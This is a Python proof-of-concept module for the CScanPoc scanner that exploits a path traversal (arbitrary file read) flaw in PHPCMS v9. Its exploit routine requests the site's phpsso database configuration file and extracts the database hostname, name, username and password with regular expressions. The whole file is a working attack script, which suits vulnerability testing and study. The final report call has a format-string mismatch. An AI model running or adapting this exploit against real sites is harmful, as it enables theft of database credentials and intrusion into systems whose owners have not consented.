# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0007' # 平台漏洞编号，留空
    name = 'PHPCMS v9 /index.php 任意文件读取' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-07-25'  # 漏洞公布时间
    desc = '''
        PHPCMS v9 /index.php 任意文件读取漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-60295' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'V9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b0bf83bf-45a0-47d5-9e66-5ddf25531afb'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(target=self.target)+("/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q="
                                                  "../../phpsso_server/caches/configs/database.php")
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()

            if ('hostname' in content) and ('username' in content):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))

            #http://0day5.com/archives/194/
            payload = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php"
            verify_url = '{target}'.format(target=self.target)+payload
            REGX_DICT = {
                'hostname':r"""'hostname'\s=>\s'(.*)'""",
                'database':r"""'database'\s=>\s'(.*)'""",
                'username':r"""'username'\s=>\s'(.*)'""",
                'password':r"""'password'\s=>\s'(.*)'"""
            }
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            db_info = {}
            for regx in REGX_DICT:
                match = re.search(REGX_DICT[regx], content)
                if match:
                    db_info[regx] = match.group(1).strip('\r')

            if match:
                username = db_info['username']
                password = db_info['password']
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(target=self.target,name=self.vuln.name,
))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()